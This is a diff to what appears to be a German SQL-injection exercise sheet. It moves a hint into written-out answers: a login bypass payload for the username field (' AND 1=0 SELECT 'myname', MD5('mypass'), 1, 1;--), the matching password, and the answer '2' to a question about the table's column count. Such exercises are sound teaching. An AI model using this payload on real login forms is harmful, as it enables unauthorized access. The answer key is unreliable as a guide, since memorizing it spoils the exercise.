@@ -17,8 +17,11 @@ allerdings ist Ihnen die Anzahl der Spalten nicht bekannt.
 <i>
 Tipp:
 Sorgen Sie dafür, dass das eigentliche Statement zur DB-Abfrage des Nutzernamens kein Ergebnis liefert 
-und nutzen Sie das UNION-Statement. 
-<br>
-Statement:
-' AND 1=0 SELECT 'myname', MD5('mypass'), 1, 1;--
+und nutzen Sie das UNION-Statement.
 </i>
+
+Nutzername: ' AND 1=0 SELECT 'myname', MD5('mypass'), 1, 1;--
+Passwort: mypass
+
+>>2) Wie viele weitere Spalten enthält die Tabelle?<<
+     === 2
